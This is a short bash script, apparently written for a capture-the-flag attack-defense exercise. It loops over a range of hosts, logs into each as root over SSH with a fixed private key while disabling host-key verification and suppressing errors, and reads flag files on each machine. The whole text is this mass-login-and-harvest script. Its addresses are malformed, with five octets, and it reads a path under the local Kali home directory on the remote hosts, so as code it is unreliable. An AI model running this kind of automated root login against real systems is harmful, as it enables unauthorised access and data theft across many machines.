for i in $(seq 101 122); 
do
  echo "172.16.10.102.$i"
  ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" root@172.16.10.102.$i -i /home/kali/Desktop/apache/key "cat /home/kali/Desktop/apache/flag.txt; echo; /var/flag; echo" 2>/dev/null
done
